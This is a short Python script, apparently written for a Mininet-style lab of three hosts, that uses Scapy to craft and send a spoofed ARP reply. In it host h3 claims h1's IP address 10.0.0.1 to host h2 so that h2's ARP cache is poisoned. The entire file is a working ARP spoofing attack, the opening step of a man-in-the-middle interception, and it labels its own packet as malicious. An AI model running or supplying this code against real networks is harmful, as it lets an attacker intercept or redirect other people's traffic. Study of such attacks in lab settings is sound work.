#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp

def send_spoofed_arp():
    print("Crafting Malicious ARP Reply")
    
    # 1. Craft the Ethernet Header
    # Sent FROM h3's real MAC, TO h2's MAC
    eth = Ether(src="00:00:0a:00:00:03", dst="00:00:0a:00:00:02")
    
    # 2. Craft the Spoofed ARP Header (claim to be h1's IP)
    arp = ARP(op=2, 
              hwsrc="00:00:0a:00:00:03", psrc="10.0.0.1", 
              hwdst="00:00:0a:00:00:02", pdst="10.0.0.2")
    
    # 3. Combine and send
    pkt = eth/arp
    print("Sending spoofed packet from h3 (claiming to be h1 - 10.0.0.1) to h2 (10.0.0.2)")
    
    sendp(pkt, iface="eth0", verbose=False)
    print("Malicious packet pushed to the network!")

if __name__ == "__main__":
    send_spoofed_arp()